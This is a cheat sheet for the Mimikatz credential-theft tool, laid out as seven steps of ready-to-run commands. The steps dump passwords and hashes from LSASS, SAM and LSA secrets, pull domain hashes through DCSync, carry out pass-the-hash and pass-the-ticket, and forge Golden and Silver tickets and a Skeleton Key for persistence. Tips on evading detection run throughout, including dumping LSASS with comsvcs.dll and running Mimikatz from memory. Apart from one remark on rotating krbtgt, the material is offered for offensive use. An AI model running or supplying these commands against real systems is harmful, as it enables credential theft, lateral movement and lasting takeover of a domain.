Mimikatz - Cheat Sheet

The Swiss-army knife for Windows credentials. Run it on a compromised host
(local admin / SYSTEM) to pull plaintext passwords, NT hashes and Kerberos
keys straight out of LSASS, dump the local SAM & LSA secrets, DCSync domain
hashes from a DC, and forge tickets for persistence.
Replace the placeholders (<...>) with your own values.


Step 1 - Launch and elevate

Grab SeDebugPrivilege so mimikatz can read other processes' memory. For
SAM / LSA / registry secrets you also need to be SYSTEM:

    privilege::debug        # -> "Privilege '20' OK"
    token::elevate          # impersonate SYSTEM (SAM/LSA/secrets)
    token::revert           # drop back to your own token

If privilege::debug fails you are not admin - LSASS reads won't work.


Step 2 - Dump logon credentials from LSASS

Pull cached creds of everyone logged on to this box - plaintext (if present),
NT hashes and Kerberos keys:

    sekurlsa::logonpasswords        # plaintext + NTLM, all sessions
    sekurlsa::logonpasswords full   # verbose, every provider
    sekurlsa::ekeys                 # Kerberos keys (incl. AES256)
    sekurlsa::wdigest               # plaintext from WDigest
    sekurlsa::msv                   # NTLM / SHA1 only
    sekurlsa::credman               # Credential Manager saved logins

AES keys from ekeys survive longer than NT hashes and are stealthier for
Pass-the-Ticket - grab them.


Step 3 - Local secrets (SAM and LSA)

    lsadump::sam                    # local SAM - local admin NT hashes
    lsadump::secrets                # LSA secrets - service acct plaintext
    lsadump::cache                  # cached domain creds (MSCACHEv2 / DCC2)

DCC2 hashes crack slowly and can't PtH, but a reused local-admin hash from
SAM often unlocks the whole subnet.


Step 4 - DCSync (steal domain hashes remotely)

With Domain Admin or replication rights, impersonate a DC and pull any
account's hash from NTDS - no code on the DC, no LSASS touch:

    # krbtgt hash - the key to Golden Tickets
    lsadump::dcsync /domain:<domain.local> /user:krbtgt

    # Any target user (e.g. a Domain Admin)
    lsadump::dcsync /domain:<domain.local> /user:<target-user>

    # Everything (loud)
    lsadump::dcsync /domain:<domain.local> /all /csv

Needs the "Replicating Directory Changes" rights (DA / Enterprise Admin /
delegated). Grab krbtgt first.


Step 5 - Pass-the-Hash / Pass-the-Ticket

Turn a recovered NT hash or Kerberos ticket into a new logon session:

    # Pass-the-Hash - spawn a process as the target
    sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt-hash> /run:cmd.exe

    # Dump tickets to disk, then inject one
    sekurlsa::tickets /export       # writes *.kirbi to current dir
    kerberos::ptt <ticket>.kirbi    # inject into current session
    kerberos::list                  # list tickets

After pth a new cmd opens as the target - use it for nxc / PsExec-style
lateral movement. Verify with klist / whoami.


Step 6 - Persistence (Golden Ticket / Silver Ticket / Skeleton Key)

    # Golden Ticket - forge a TGT for any user (needs krbtgt hash + domain SID)
    kerberos::golden /user:Administrator /domain:<domain.local> \
      /sid:<domain-SID> /krbtgt:<krbtgt-nt-hash> /ptt

    # Silver Ticket - forge a service ticket (needs the service acct hash)
    kerberos::golden /user:Administrator /domain:<domain.local> \
      /sid:<domain-SID> /target:<server.fqdn> /service:cifs \
      /rc4:<service-nt-hash> /ptt

    # Skeleton Key - run on the DC, then log in anywhere with password "mimikatz"
    misc::skeleton

Golden Tickets are long-lived domain persistence - rotating krbtgt twice is
the only real fix. Skeleton Key dies on DC reboot.


Step 7 - Offline dump and anti-detection

Prefer not to run mimikatz.exe on a monitored box. Dump LSASS with a
living-off-the-land tool, exfil, and parse elsewhere:

    # On the victim - dump LSASS with built-in comsvcs.dll
    rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Temp\lsass.dmp full

    # Feed the dump to mimikatz (offline)
    sekurlsa::minidump C:\Temp\lsass.dmp
    sekurlsa::logonpasswords

    # ...or skip mimikatz and parse on Kali
    pypykatz lsa minidump lsass.dmp

The mimikatz binary is signatured everywhere - rename it, run from memory
(Invoke-Mimikatz / C2 in-memory), or just parse the dump offline.


Key idea: mimikatz is the reference implementation for Windows credential
theft. On any host you own with admin/SYSTEM, LSASS hands you the credentials
of everyone logged on there - and if a Domain Admin ever touched the box, or
you gain DCSync rights, the krbtgt hash lets you forge tickets and own the
domain indefinitely. Because the binary is loudly signatured, the mature play
is to dump LSASS with native tooling and run mimikatz (or pypykatz) offline,
reaching for sekurlsa::pth, dcsync and kerberos::golden only when needed.
